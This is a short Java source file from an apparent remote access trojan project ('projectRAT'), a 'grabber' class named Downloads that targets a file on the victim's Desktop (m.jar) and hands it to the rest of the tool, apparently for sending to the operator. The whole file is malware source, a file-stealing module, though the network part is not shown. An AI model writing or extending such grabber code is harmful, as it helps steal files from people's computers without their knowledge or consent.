package in.momin5.projectRAT.request.grabbers;

import in.momin5.projectRAT.request.Request;

import java.io.File;

public class Downloads implements Request {

    File file;
    @Override
    public void init() throws Exception {
        file = new File(System.getProperty("user.home") + "/Desktop/m.jar");
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File getFile() {
        return file;
    }
}
